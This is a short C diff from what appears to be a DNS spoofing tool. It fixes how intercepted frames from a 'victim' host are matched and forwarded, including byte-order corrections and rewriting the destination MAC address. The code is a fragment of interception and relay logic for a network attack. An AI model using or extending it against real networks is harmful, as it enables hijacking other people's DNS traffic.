@@ -225,6 +225,8 @@ dnsf_ckr_action_t dnsf_ckr_proc_ip_packet(const unsigned char *pkt, const size_t
                     }
                     free(dns);
                 }
+            } else {
+                action = dnsf_ckr_proc_eth_frame(pkt, pktsz, outpkt, outpktsz, transactions);
             }
             if (udp != NULL) {
                 if (udp->payload != NULL) {
@@ -232,6 +234,8 @@ dnsf_ckr_action_t dnsf_ckr_proc_ip_packet(const unsigned char *pkt, const size_t
                 }
                 free(udp);
             }
+        } else {
+            action = dnsf_ckr_proc_eth_frame(pkt, pktsz, outpkt, outpktsz, transactions);
         }
 
     }
@@ -249,7 +253,7 @@ dnsf_ckr_action_t dnsf_ckr_proc_eth_frame(const unsigned char *frame, const size
     dnsf_ckr_realdnstransactions_ctx *tp;
     unsigned long dest_addr, src_addr;
     int must_process = 0;
-    unsigned char *mac_byte; //  a shakespearian variable @:-)
+    unsigned char *mac_byte, *out_p; //  a shakespearian variable @:-)
     if (outpkt == NULL || outpktsz == NULL) {
         return dnsf_ckr_action_none;
     }
@@ -260,11 +264,12 @@ dnsf_ckr_action_t dnsf_ckr_proc_eth_frame(const unsigned char *frame, const size
                        (((unsigned long)*((frame + 14) + 13)) << 16) |
                        (((unsigned long)*((frame + 14) + 14)) <<  8) |
                        ((unsigned long)*((frame + 14) + 15));
+            src_addr = htonl(src_addr);
             dest_addr = (((unsigned long)*((frame + 14) + 16)) << 24) |
                         (((unsigned long)*((frame + 14) + 17)) << 16) |
                         (((unsigned long)*((frame + 14) + 18)) <<  8) |
                         ((unsigned long)*((frame + 14) + 19));
-            dest_addr = htons(dest_addr);
+            dest_addr = htonl(dest_addr);
             for (tp = transactions; tp; tp = tp->next) {
                 must_process = (tp->sends_reqs_to->addr == dest_addr &&
                                 tp->victim->addr == src_addr);
@@ -275,9 +280,10 @@ dnsf_ckr_action_t dnsf_ckr_proc_eth_frame(const unsigned char *frame, const size
             if (must_process) {
                 *outpkt = (unsigned char *) dnsf_ckr_getmem(framesz);
                 *outpktsz = framesz;
-                memcpy(*outpkt, frame, framesz);
+                out_p = *outpkt;
+                memcpy(out_p, frame, framesz);
                 mac_byte = dnsf_ckr_mac2byte(tp->sends_reqs_to->hw_addr, 6);
-                memcpy(*(outpkt + 6), mac_byte, 6); //  mac size
+                memcpy(out_p, mac_byte, 6); //  mac size
                 free(mac_byte);
                 action = dnsf_ckr_action_repass;
             }
